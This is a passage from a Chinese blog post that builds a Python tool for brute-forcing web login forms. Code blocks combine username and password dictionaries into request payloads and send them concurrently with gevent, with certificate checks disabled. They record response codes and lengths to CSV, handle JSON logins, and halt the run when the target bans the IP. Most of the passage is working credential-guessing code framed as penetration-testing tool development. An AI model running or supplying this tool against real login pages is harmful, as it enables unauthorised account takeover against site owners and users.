+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sender</span>(<span class="params">url,payloads,headers,method</span>):</span></span><br><span class="line">    sem = BoundedSemaphore(<span class="number">1</span>) <span class="comment">#锁</span></span><br><span class="line">    result=[]</span><br><span class="line"></span><br><span class="line">    jobs = []</span><br><span class="line">    p = Pool(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        jobs.append(p.spawn(send_request, url, payload, headers, method,result,sem))</span><br><span class="line">    gevent.joinall(jobs, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url,payload,headers,method,result,sem</span>):</span></span><br><span class="line">    <span class="comment">#发送数据包</span></span><br><span class="line">    resp=requests.request(**&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">        <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="comment"># &#x27;proxies&#x27;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    sem.acquire()</span><br><span class="line">    result.append([payload,resp.status_code,<span class="built_in">len</span>(resp.text)])</span><br><span class="line">    sem.release()</span><br></pre></td></tr></table></figure>
+
+<p>sender函数用于发送数据包，</p>
+<p>首先创建一个锁sem = BoundedSemaphore(1) ， 参数为1 意味着同一时间只能有一个协程获得锁</p>
+<p>result列表用于记录结果</p>
+<p>send_reques函数最后两个参数为锁和用于结果保存的变量，请求完成之后会将关键信息写入result中，为了防止多协程访问导致变量异常，引入了锁。</p>
+<pre><code>sem.acquire()
+result.append([payload,resp.status_code,len(resp.text)])
+sem.release()
+</code></pre>
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112213910373.png" alt="image-20220112213910373"></p>
+<p>然后是创建一个函数保存结果到文件中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">savecsv</span>(<span class="params">result</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;222.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        writer.writerow(i)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220112231551862.png" alt="image-20220112231551862"></p>
+<p>成功</p>
+<h3 id="5-优化用户交互-amp-代码优化"><a href="#5-优化用户交互-amp-代码优化" class="headerlink" title="5. 优化用户交互 &amp; 代码优化"></a>5. 优化用户交互 &amp; 代码优化</h3><p>从使用的角度来看，需要支持以下功能</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python  xxx.py    直接运行，会对存放目录的数据包进行批量检测。</span><br><span class="line"></span><br><span class="line">-p  password.txt  可以指定自定义字典。</span><br><span class="line"></span><br><span class="line">-u  username.txt 可以指定用户名字典。</span><br><span class="line"></span><br><span class="line">输出结果的文件为指定IP+文件后缀。</span><br><span class="line"></span><br><span class="line">进程控制：可以指定协程的数量( 默认为5)。</span><br><span class="line"></span><br><span class="line">错误控制: 如数据包中没找到用户名和密码字段，会直接报错，退出程序。</span><br></pre></td></tr></table></figure>
+
+<p>获取用户参数代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parser</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.description = <span class="string">&#x27;可指定用户名和密码字典、线程数量&#x27;</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--thread&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定协程数，默认为5&quot;</span>, dest=<span class="string">&quot;tnum&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定自定义字典路径&quot;</span>, dest=<span class="string">&quot;ppath&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;dictionary/password.txt&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="三-后续优化"><a href="#三-后续优化" class="headerlink" title="三.后续优化"></a>三.后续优化</h2><h3 id="1-JSON格式传输数据"><a href="#1-JSON格式传输数据" class="headerlink" title="1. JSON格式传输数据"></a>1. JSON格式传输数据</h3><p>实际测试中有一部分目标使用的是JSON格式传输，其数据字段如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;referer&quot;:&quot;index.html&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试使用字符串的replace方法来进行payload生成、</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为有的数据是通过JSON传输的，因此考虑使用正则匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload_v2</span>(<span class="params">usernameandpassowrd=<span class="string">&quot;yonghuming=qwrdxername&amp;mima=qwrdxerpasswd&amp;session=DAWAWRFWAFAWEDF&amp;test=testets&quot;</span></span>):</span></span><br><span class="line"></span><br><span class="line">    payloadlist=[]</span><br><span class="line">    <span class="keyword">for</span> username <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;dictionary/username.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;UTF-8-sig&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;dictionary/password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;UTF-8-sig&#x27;</span>):</span><br><span class="line">            tmp=usernameandpassowrd</span><br><span class="line">            tmp2=tmp.replace(<span class="string">&quot;qwrdxername&quot;</span>,username.strip())</span><br><span class="line">            tmp3=tmp2.replace(<span class="string">&quot;qwrdxerpassword&quot;</span>,password.strip())</span><br><span class="line">            payloadlist.append(tmp3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload个数为:%d&quot;</span>%<span class="built_in">len</span>(payloadlist))</span><br><span class="line">    <span class="keyword">return</span> payloadlist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20220113105029956.png" alt="image-20220113105029956"></p>
+<p>性能居然提升了。</p>
+<h3 id="2-被ban-IP的问题"><a href="#2-被ban-IP的问题" class="headerlink" title="2.被ban IP的问题"></a>2.被ban IP的问题</h3><p>实际应用中。测试了一个目标，扫描太快被封禁了，但那几千个协程还是要执行啊， 每一个等待5秒肯定不行的</p>
+<p>需求: 如果目标返回无法建立连接，将gevent创建的所有协程kill掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPConnectionPool(host=<span class="string">&#x27;&#x27;</span>, port=<span class="number">80</span>): Max retries exceeded <span class="keyword">with</span> url: </span><br></pre></td></tr></table></figure>
+
+<p> 用到gevent.killall 来关闭</p>
+<p>对发包代码修改如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url,payload,headers,method,result,sem</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.request(**&#123;</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">            <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="comment"># &#x27;proxies&#x27;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment"># 好像不加锁也不会报错，疑惑</span></span><br><span class="line">        sem.acquire()</span><br><span class="line">        result.append([payload, resp.status_code, <span class="built_in">len</span>(resp.text)])</span><br><span class="line">        sem.release()</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已被目标IP封&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>经测试，以上方法行不通，问题可能出现在for循环，</p>
+<p>另一种思路: 引入一个控制信号量 controller </p>
+<ol>
+<li>协程发包前检查这个变量，若值为1，不发包退出。</li>
+<li>若值为0，进行发包操作。</li>
+<li>如果发包过程中产生了异常，设置这个信号量为1 。</li>
+</ol>
+<p>在python中没有指针，用列表记录信号量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url,payload,headers,method,result,sem,controller</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> controller[<span class="number">0</span>]==<span class="number">1</span>:<span class="comment"># 若值为1，不发包退出。</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;目标已down&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        resp = requests.request(**&#123;</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;verify&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span>: headers,</span><br><span class="line">            <span class="string">&#x27;allow_redirects&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="comment"># &#x27;proxies&#x27;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment"># 好像不加锁也不会报错，疑惑</span></span><br><span class="line">        sem.acquire()</span><br><span class="line">        result.append([payload, resp.status_code, <span class="built_in">len</span>(resp.text)])</span><br><span class="line">        sem.release()</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已被目标IP封&quot;</span>)</span><br><span class="line">        controller[<span class="number">0</span>]=<span class="number">1</span><span class="comment">#如果发包过程中产生了异常，设置这个信号量为1 。</span></span><br></pre></td></tr></table></figure>
+
+<p>基本完成了功能需求</p>
+<h3 id="3-输出结果优化"><a href="#3-输出结果优化" class="headerlink" title="3. 输出结果优化"></a>3. 输出结果优化</h3><p>输出为CSV，在burpsutie爆破中，一般是对返回值和返回长度进行排序，但csv并没有排序功能，因此需要在开发一个小脚本对输出结果进行处理，生成按返回值排序和按长度排序的结果，方便对比查看。</p>
+<h3 id="4-钉钉提醒"><a href="#4-钉钉提醒" class="headerlink" title="4. 钉钉提醒"></a>4. 钉钉提醒</h3><blockquote>
+<p>参考</p>
+<p>web页面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>python与Burp Suite联动暴力破解 </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260406.html">https://www.freebuf.com/articles/web/260406.html</a><br>python解析http包并发送:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<p>[[图灵程序设计丛书].Python语言及其应用  第十一章</p>
+<p>Gevent介绍</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/73ccb425a710">https://www.jianshu.com/p/73ccb425a710</a></p>
+<p>gevent官方文档</p>
+<p><a target="_blank" rel="noopener" href="http://www.gevent.org/contents.html">http://www.gevent.org/contents.html</a></p>
+<p>Python gevent高并发（限制最大并发数、协程池）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>kill掉全部的greenlet</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpython.com/qa/135874">https://www.cnpython.com/qa/135874</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/渗透测试/">渗透测试</a>, <a href="/tags/工具开发/">工具开发</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:qwrdxer.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/web安全工具篇/">web安全工具篇</a><small>3</small></li>
+  
+    <li><a href="/categories/web安全漏洞篇/">web安全漏洞篇</a><small>2</small></li>
+  
+    <li><a href="/categories/开发工具/">开发工具</a><small>3</small></li>
+  
+    <li><a href="/categories/日志/">日志</a><small>1</small></li>
+  
+    <li><a href="/categories/渗透测试篇/">渗透测试篇</a><small>1</small></li>
+  
+    <li><a href="/categories/环境配置/">环境配置</a><small>1</small></li>
+  
+    <li><a href="/categories/脚本/">脚本</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2022/01/12/杂项/GITHUB收集/">GITHUB收集</a>
+      </li>
+    
+      <li>
+        <a href="/2022/01/11/自动化脚本&amp;工具开发/web页面密码爆破/">web页面密码爆破</a>
+      </li>
+    
+      <li>
+        <a href="/2022/01/09/web安全工具篇/Goby分析/">Goby分析</a>
+      </li>
+    
+      <li>
+        <a href="/2022/01/09/日志/life-record-2021-1/">life record 2021-1</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/15/开发工具/Shell脚本学习笔记/">Shell脚本学习笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/MySQL/">MySQL</a><small>1</small></li>
+  
+    <li><a href="/tags/WordPress/">WordPress</a><small>1</small></li>
+  
+    <li><a href="/tags/bash/">bash</a><small>2</small></li>
+  
+    <li><a href="/tags/docker/">docker</a><small>1</small></li>
+  
+    <li><a href="/tags/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>1</small></li>
+  
+    <li><a href="/tags/shell/">shell</a><small>1</small></li>
+  
+    <li><a href="/tags/web漏洞/">web漏洞</a><small>2</small></li>
+  
+    <li><a href="/tags/工具使用/">工具使用</a><small>5</small></li>
+  
+    <li><a href="/tags/工具开发/">工具开发</a><small>1</small></li>
+  
+    <li><a href="/tags/开发/">开发</a><small>1</small></li>
+  
+    <li><a href="/tags/报错解决/">报错解决</a><small>1</small></li>
+  
+    <li><a href="/tags/文件包含/">文件包含</a><small>1</small></li>
+  
+    <li><a href="/tags/渗透测试/">渗透测试</a><small>4</small></li>
+  
+    <li><a href="/tags/环境配置/">环境配置</a><small>1</small></li>
+  
+    <li><a href="/tags/脚本/">脚本</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/bash/" style="font-size: 13.33px;">bash</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/linux/" style="font-size: 13.33px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 20px;">工具使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" style="font-size: 10px;">工具开发</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 10px;">开发</a> <a href="/tags/%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">报错解决</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 16.67px;">渗透测试</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">环境配置</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 16.67px;">脚本</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2022 qwrdxer
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
